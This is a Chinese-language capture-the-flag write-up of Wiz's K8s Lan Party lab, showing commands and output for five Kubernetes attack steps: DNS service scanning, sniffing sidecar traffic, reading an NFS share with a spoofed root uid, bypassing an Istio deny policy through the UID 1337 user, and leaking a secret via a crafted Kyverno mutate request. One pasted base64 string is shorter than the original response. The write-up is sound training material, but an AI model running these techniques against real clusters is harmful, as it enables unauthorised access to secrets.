---
layout: post
title: WriteUp - K8s Lan Party by wiz.io
date: '2024-06-07 08:29:39'
tags:
- cloud
- k8s
---

> 本 WriteUp 大部分参考 [https://wiki.teamssix.com/cloudnative/kubernetes/wiz-k8s-lan-party-wp.html](https://wiki.teamssix.com/cloudnative/kubernetes/wiz-k8s-lan-party-wp.html#references)

## RECON

> DNSing with the stars
> You have shell access to compromised a Kubernetes pod at the bottom of this page, and your next objective is to compromise other internal services further. As a warmup, utilize [DNS scanning](https://thegreycorner.com/2023/12/13/kubernetes-internal-service-discovery.html#kubernetes-dns-to-the-partial-rescue) to uncover hidden internal services and obtain the flag. We have "loaded your machine with [dnscan](https://gist.github.com/nirohfeld/c596898673ead369cb8992d97a1c764e) to ease this process for further challenges. All the flags in the challenge follow the same format: wiz_k8s_lan_party{*}

### 查找自己 pod 所在的网段

    player@wiz-k8s-lan-party:~$ env | grep KUBERNETES
    KUBERNETES_SERVICE_PORT_HTTPS=443
    KUBERNETES_SERVICE_PORT=443
    KUBERNETES_PORT_443_TCP=tcp://10.100.0.1:443
    KUBERNETES_PORT_443_TCP_PROTO=tcp
    KUBERNETES_PORT_443_TCP_ADDR=10.100.0.1
    KUBERNETES_SERVICE_HOST=10.100.0.1
    KUBERNETES_PORT=tcp://10.100.0.1:443
    KUBERNETES_PORT_443_TCP_PORT=443
    player@wiz-k8s-lan-party:~$ cat /etc/resolv.conf
    search k8s-lan-party.svc.cluster.local svc.cluster.local cluster.local us-west-1.compute.internal
    nameserver 10.100.120.34
    options ndots:5
    

### 服务发现

    player@wiz-k8s-lan-party:~$ dnscan -subnet 10.100.*.*
    34899 / 65536 [->] 53.25% 987 p/s10.100.136.254 getflag-service.k8s-lan-party.svc.cluster.local.
    65356 / 65536 [->] 99.73% 989 p/s10.100.136.254 -> getflag-service.k8s-lan-party.svc.cluster.local.
    player@wiz-k8s-lan-party:~$ 
    

### 访问服务

    player@wiz-k8s-lan-party:~$ curl getflag-service.k8s-lan-party.svc.cluster.local
    wiz_k8s_lan_party{between-thousands-of-ips-you-found-your-northen-star}
    

获取 flag: `wiz_k8s_lan_party{between-thousands-of-ips-you-found-your-northen-star}`

## FINDING NEIGHBOURS

> Hello?
> Sometimes, it seems we are the only ones around, but we should always be on guard against invisible [sidecars](https://kubernetes.io/docs/concepts/workloads/pods/sidecar-containers/) reporting sensitive secrets.

根据提示应该是当前 pod 有一个隐藏的 `sidecars` 容器，共享网络的 **namespace**。

### 查看网络连接等信息

用 `netstat` 看下

    layer@wiz-k8s-lan-party:~$ netstat -neo
    Active Internet connections (w/o servers)
    Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      Timer
    tcp        0      0 192.168.11.95:55720     10.100.171.123:80       TIME_WAIT   0          0          timewait (43.81/0/0)
    

发现 `10.100.171.123:80` 连接，`ss` 看不到信息，判断是 `sidecars` 发起的

    player@wiz-k8s-lan-party:~$ ss -tnp
    State            Recv-Q            Send-Q                       Local Address:Port                       Peer Address:Port            Process
    

### 使用 tcpdump 捕获流量

    layer@wiz-k8s-lan-party:~$ tcpdump host 10.100.171.123 -s 0 -A | grep wiz_k8s_lan_party 
    tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
    listening on ns-d6d5f3, link-type EN10MB (Ethernet), snapshot length 262144 bytes
    wiz_k8s_lan_party{good-crime-comes-with-a-partner-in-a-sidecar}
    

- `-s 0` captures the entire packet data (headers and payload).
- `-A` prints the packet data in ASCII format.

获取 flag: `wiz_k8s_lan_party{good-crime-comes-with-a-partner-in-a-sidecar}`

## DATA LEAKAGE

> Exposed File Share
> The targeted big corp utilizes outdated, yet cloud-supported technology for data storage in production. But oh my, this technology was introduced in an era when access control was only network-based 🤦‍️.

看描述关于文件共享的，是通过基于网络的访问控制做的访问控制策略，需要打破基于网络的访问控制。查看提示：

> You might find it useful to look at the [documentaion](https://github.com/sahlberg/libnfs) for nfs-cat and nfs-ls. The following NFS parameters should be used in your connection string: version, uid and gid

### 查看 nfs 挂载

    player@wiz-k8s-lan-party:~$ mount|grep -i "nfs"
    fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com:/ on /efs type nfs4 (ro,relatime,vers=4.1,rsize=1048576,wsize=1048576,namlen=255,hard,noresvport,proto=tcp,timeo=600,retrans=2,sec=sys,clientaddr=192.168.57.108,local_lock=none,addr=192.168.124.98)
    

获取到信息

- 路径 `fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com`
- 挂载点 `/efs`
- 版本 `vers=4.1`

查看系统 `/efs`

    player@wiz-k8s-lan-party:~$ ls /efs
    flag.txt
    player@wiz-k8s-lan-party:~$ cat /efs/flag.txt
    cat: /efs/flag.txt: Permission denied
    

### 使用 `nfs-ls`

根据提示使用 `nfs-ls` 查看，需要加上 version uid gid 参数

    URL-FORMAT:
    nfs://[<username>@]<server|ipv4|ipv6>[:<port>]/path[?arg=val[&arg=val]*]
    uid=<int>         : UID value to use when talking to the server.
                         default it 65534 on Windows and getuid() on unixen.
    gid=<int>         : GID value to use when talking to the server.
                         default it 65534 on Windows and getgid() on unixen.
    version=<3|4>     : NFS Version. Default is 3.
    

添加参数构造链接查看

    player@wiz-k8s-lan-party:~$ nfs-ls "nfs://fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com/?version=4&uid=0&gid=0"
    ----------  1     1     1           73 flag.txt
    

### 使用 `nfs-cat`

    player@wiz-k8s-lan-party:~$ nfs-cat "nfs://fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com/flag.txt?version=4&uid=0&gid=0"
    Failed to mount nfs share : nfs_mount_async failed. Bad export path. Absolute path does not start with '/'
    Failed to open nfs://fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com/flag.txt?version=4&uid=0&gid=0
    player@wiz-k8s-lan-party:~$ nfs-cat "nfs://fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com//flag.txt?version=4&uid=0&gid=0"
    wiz_k8s_lan_party{old-school-network-file-shares-infiltrated-the-cloud!}
    

第一次 `nfs-cat` 错误提示绝对路径 `flag.txt` 前面需要 `/` 添加后执行成功，获取 flag: `wiz_k8s_lan_party{old-school-network-file-shares-infiltrated-the-cloud!}`

## BYPASSING BOUNDARIES

> The Beauty and The Ist
> Apparently, new service mesh technologies hold unique appeal for ultra-elite users (root users). Don't abuse this power; use it responsibly and with caution.

看起来有新的 service mesh。

### 服务发现

    root@wiz-k8s-lan-party:~# dnscan -subnet 10.100.*.*
    10.100.224.159 -> istio-protected-pod-service.k8s-lan-party.svc.cluster.local.
    

直接请求返回 `RBAC: access denied`

### 查看策略

    apiVersion: security.istio.io/v1beta1
    kind: AuthorizationPolicy
    metadata:
      name: istio-get-flag
      namespace: k8s-lan-party
    spec:
      action: DENY
      selector:
        matchLabels:
          app: "{flag-pod-name}"
      rules:
      - from:
        - source:
            namespaces: ["k8s-lan-party"]
        to:
        - operation:
            methods: ["POST", "GET"]
    

### 查看提示

> Try examining Istio's [IPTables rules](https://github.com/istio/istio/wiki/Understanding-IPTables-snapshot#use-pid-to-get-iptables). Try executing "cat /etc/passwd | grep 1337", to find the user that can bypass the Istio's IPTables rules

使用 gpt 解释上面的配置

> 总结一下，这个 `AuthorizationPolicy` 配置拒绝来自 `k8s-lan-party` 命名空间的所有 `POST` 和 `GET` 请求访问标签为 `app={flag-pod-name}` 的 Pod。这可以用于保护关键的应用程序 Pod，防止未经授权的访问。

使用 gpt 解释提示中的 Istio IPTables rules 部分

    Istio 使用 iptables 规则来劫持流量,将其重定向到 sidecar 代理容器中的 Envoy 代理。以下是 Istio 中一些重要的 iptables 规则:
    
    ## ISTIO_OUTPUT 链
    
    这是 Istio 中最关键的 iptables 链,包含以下规则:
    
    1. 允许来自 Envoy 代理的本地流量 (源IP 127.0.0.6) 直接返回,不经过重定向。[4]
    
    2. 将目的地不是 localhost 且来自 UID 1337 (Envoy 代理)的流量重定向到 ISTIO_IN_REDIRECT 链。[4]
    
    3. 允许目的地是 localhost 且不来自 UID 1337 的流量直接返回。[4]
    
    4. 允许来自 UID 1337 的流量直接返回,不重定向。[4]
    
    5. 将目的地不是 localhost 且来自 GID 1337 的流量重定向到 ISTIO_IN_REDIRECT 链。[4]
    
    6. 允许目的地是 localhost 且不来自 GID 1337 的流量直接返回。[4]  
    
    7. 允许来自 GID 1337 的流量直接返回,不重定向。[4]
    
    8. 允许目的地是 localhost 的流量直接返回。[4]
    
    9. 将所有其他流量重定向到 ISTIO_REDIRECT 链。[4]
    
    ## ISTIO_REDIRECT 链
    
    将流量重定向到 Envoy 代理的出站端口 15001。[4]
    
    ## ISTIO_IN_REDIRECT 链  
    
    将流量重定向到 Envoy 代理的入站端口 15006。[1][2]
    
    这些 iptables 规则确保所有进出 pod 的流量都经过 Envoy 代理处理,实现了 Istio 的流量管理、安全控制等功能。规则中的 UID 1337 和 GID 1337 用于区分代理和应用程序流量。[4]
    
    Citations:
    [1] https://jimmysong.io/en/blog/istio-sidecar-traffic-types/
    [2] https://tetrate.io/blog/traffic-types-and-iptables-rules-in-istio-sidecar-explained/
    [3] https://stackoverflow.com/questions/67223438/why-iptables-rule-setup-in-initcontainer-istio-init-works-in-application-conta
    [4] https://github.com/istio/istio/wiki/Understanding-IPTables-snapshot
    [5] https://istio.io/latest/docs/ops/best-practices/security/
    

### 限制绕过

上面资料可以得知， `uid/gid` 为 `1337` 的用户拥有特殊权限，可以通过切换到该用户绕过访问策略

    root@wiz-k8s-lan-party:~# cat /etc/passwd | grep 1337
    istio:x:1337:1337::/home/istio:/bin/sh
    root@wiz-k8s-lan-party:~# su istio
    $ dnscan -subnet 10.100.*.*
    57310 / 65536 [---------------------------------------------------------------------------------------------------------->_______________] 87.45% 962 p/s10.100.224.159 istio-protected-pod-service.k8s-lan-party.svc.cluster.local.
    65376 / 65536 [------------------------------------------------------------------------------------------------------------------------->] 99.76% 961 p/s10.100.224.159 -> istio-protected-pod-service.k8s-lan-party.svc.cluster.local.
    $ curl istio-protected-pod-service.k8s-lan-party.svc.cluster.local
    wiz_k8s_lan_party{only-leet-hex0rs-can-play-both-k8s-and-linux}
    $
    

获得 flag: `wiz_k8s_lan_party{only-leet-hex0rs-can-play-both-k8s-and-linux}`

## LATERAL MOVEMENT

> Who will guard the guardians?
> Where pods are being mutated by a foreign regime, one could abuse its bureaucracy and leak sensitive information from the [administrative](https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/#request) services.

### 查看策略

    apiVersion: kyverno.io/v1
    kind: Policy
    metadata:
      name: apply-flag-to-env
      namespace: sensitive-ns
    spec:
      rules:
        - name: inject-env-vars
          match:
            resources:
              kinds:
                - Pod
          mutate:
            patchStrategicMerge:
              spec:
                containers:
                  - name: "*"
                    env:
                      - name: FLAG
                        value: "{flag}"
    

本策略重点：

- namespace 为 `sensitive-ns`
- 规则
- `resource kind` 为 `Pod`
- `mutate` 情况下带入 `{flag}` 环境变量

### 查看提示

> Need a hand crafting AdmissionReview requests? Checkout [https://github.com/anderseknert/kube-review](https://github.com/anderseknert/kube-review). This exercise consists of three ingredients: kyverno's hostname (which can be found via dnscan), the relevant HTTP path (which can be found in Kyverno's source code) and the AdmissionsReview request.

提示涉及到 AdmissionReview 请求和 kube-review 工具，以及发现 kyverno 服务，找到 kyverno 的 HTTP path，并且发送 AdmissionsReview 请求。

### kyverno 服务器发现

    $ dnscan -subnet 10.100.*.*
    10.100.86.210 -> kyverno-cleanup-controller.kyverno.svc.cluster.local.
    10.100.126.98 -> kyverno-svc-metrics.kyverno.svc.cluster.local.
    10.100.158.213 -> kyverno-reports-controller-metrics.kyverno.svc.cluster.local.
    10.100.171.174 -> kyverno-background-controller-metrics.kyverno.svc.cluster.local.
    10.100.217.223 -> kyverno-cleanup-controller-metrics.kyverno.svc.cluster.local.
    10.100.232.19 -> kyverno-svc.kyverno.svc.cluster.local.
    

得到 kyverno 的服务地址 `kyverno-svc.kyverno.svc.cluster.local`

### 找到 kyverno 的 HTTP path

查询文档得知：

1. **Mutate Requests**:
The relevant HTTP path for mutate requests is typically `/mutate`.
2. **Validate Requests**: The relevant HTTP path for validate requests is typically `/validate-policy`.
3. **Other Paths**: Kyverno may also use other HTTP paths for specific purposes, such as `/apis/networking.k8s.io/v1/ingresses` for querying Ingress resources, as shown in the example policy in the provided sources. 结合 gpt 给出的例子，请求应该是这样的

    curl --http1.1 -X POST -H "Content-Type: application/json" --data-binary @admissionreview.json https://your-admission-webhook-url/mutate
    

### 创建配置

> 这一步在本地完成

新建一个创建 sensitive-ns namespace 的 pod 的配置文件 `mutate.yaml`

    apiVersion: v1
    kind: Pod
    metadata:
      name: apply-flag-to-env
      namespace: sensitive-ns
    spec:
      containers:
        - name: nginx
          image: nginx
    

使用 kube-review 转换为 AdmissionReview 请求数据

    ./kube-review create mutate.yaml
    

![](assets/img/blog/imported/writeup-k8s-lan-party-by-wiz.io-Pasted-image-20240607154336.png)
保存转换后的数据到线上靶场 `post.json`

### 执行 mutate

    player@wiz-k8s-lan-party:~$ curl --http1.1 -X POST -H "Content-Type: application/json" --data-binary @post.json https://kyverno-svc.kyverno.svc.cluster.local/mutate -k | jk
    {"kind":"AdmissionReview","apiVersion":"admission.k8s.io/v1","request":{"uid":"efdec7a8-81ba-46dd-bcda-c77ba875cac5","kind":{"group":"","version":"v1","kind":"Pod"},"resource":{"group":"","version":"v1","resource":"pods"},"requestKind":{"group":"","version":"v1","kind":"Pod"},"requestResource":{"group":"","version":"v1","resource":"pods"},"name":"apply-flag-to-env","namespace":"sensitive-ns","operation":"CREATE","userInfo":{"username":"kube-review","uid":"bd1261ef-efab-4f4b-aba3-805929653144"},"object":{"kind":"Pod","apiVersion":"v1","metadata":{"name":"apply-flag-to-env","namespace":"sensitive-ns","creationTimestamp":null},"spec":{"containers":[{"name":"nginx","image":"nginx","resources":{}}]},"status":{}},"oldObject":null,"dryRun":true,"options":{"kind":"CreateOptions","apiVersion":"meta.k8s.io/v1"}},"response":{"uid":"efdec7a8-81ba-46dd-bcda-c77ba875cac5","allowed":true,"patch":"W3sib3AiOiJhZGQiLCJwYXRoIjoiL3NwZWMvY29udGFpbmVycy8wL2VudiIsInZhbHVlIjpbeyJuYW1lIjoiRkxBRyIsInZhbHVlIjoid2l6X2s4c19sYW5fcGFydHl7eW91LWFyZS1rOHMtbmV0LW1hc3Rlci13aXRoLWdyZWF0LXBvd2VyLXRvLW11dGF0ZS15b3VyLXdheS10by12aWN0b3J5fSJ9XX0sIHsicGF0aCI6Ii9tZXRhZGF0YS9hbm5vdGF0aW9ucyIsIm9wIjoiYWRkIiwidmFsdWUiOnsicG9saWNpZXMua3l2ZXJuby5pby9sYXN0LWFwcGxpZWQtcGF0Y2hlcyI6ImluamVjdC1lbnYtdmFycy5hcHBseS1mbGFnLXRvLWVudi5reXZlcm5vLmlvOiBhZGRlZCAvc3BlYy9jb250YWluZXJzLzAvZW52XG4ifX1d","patchType":"JSONPatch"}}
    

获取 response 
![](assets/img/blog/imported/writeup-k8s-lan-party-by-wiz.io-Pasted-image-20240607154530.png)
### 解码

解码响应中的数据

    player@wiz-k8s-lan-party:~$ echo 'W3sib3AiOiJhZGQiLCJwYXRoIjoiL3NwZWMvY29udGFpbmVycy8wL2VudiIsInZhbHVlIjpbeyJuYfcGFydHl7eW91LWFyZS1rOHMtbmV0LW1hc3Rlci13aXRoLWdyZWF0LXBvd2VyLXRvLW11dGF0ZS15b3VyLXdheS10by12aWN0b3J5fSJ9XX0sIHsicGF0aCI6Ii9tZXRhZGF0YS9hbm5vdGF0aW9ucyIsIm9wIjoiYWRkIiwidmFsdWUiOnsicG9saWNpZXMua3l2ZXJuby5pby9sYXN0LWFwcGxpZWQtcGF0Y2hlcyI6ImluamVjdC1lbnYtdmFycy5hcHBseS1mbGFnLXRvLWVudi5reXZlcm5vLmlvOiBhZGRlZCAvc3BlYy9jb250YWluZXJzLzAvZW52XG4ifX1d' | base64 -d | jq
    [
      {
        "op": "add",
        "path": "/spec/containers/0/env",
        "value": [
          {
            "name": "FLAG",
            "value": "wiz_k8s_lan_party{you-are-k8s-net-master-with-great-power-to-mutate-your-way-to-victory}"
          }
        ]
      },
      {
        "path": "/metadata/annotations",
        "op": "add",
        "value": {
          "policies.kyverno.io/last-applied-patches": "inject-env-vars.apply-flag-to-env.kyverno.io: added /spec/containers/0/env\n"
        }
      }
    ]
    

得到 flag: `wiz_k8s_lan_party{you-are-k8s-net-master-with-great-power-to-mutate-your-way-to-victory}`

---

## Resources:

| Link | Info |
|---|---|
|[https://k8slanparty.com/](https://k8slanparty.com/)|K8s Lan Party|
|[https://wiki.teamssix.com/cloudnative/kubernetes/wiz-k8s-lan-party-wp.html](https://wiki.teamssix.com/cloudnative/kubernetes/wiz-k8s-lan-party-wp.html)|WIZ K8S LAN Party Writeup|
|[https://thegreycorner.com/2023/12/13/kubernetes-internal-service-discovery.html](https://thegreycorner.com/2023/12/13/kubernetes-internal-service-discovery.html)|Kubernetes Internal Service Discovery|

Created Date: June 6th 2024 (09:35 pm) 

Last Modified Date: June 6th 2024 (09:35 pm)
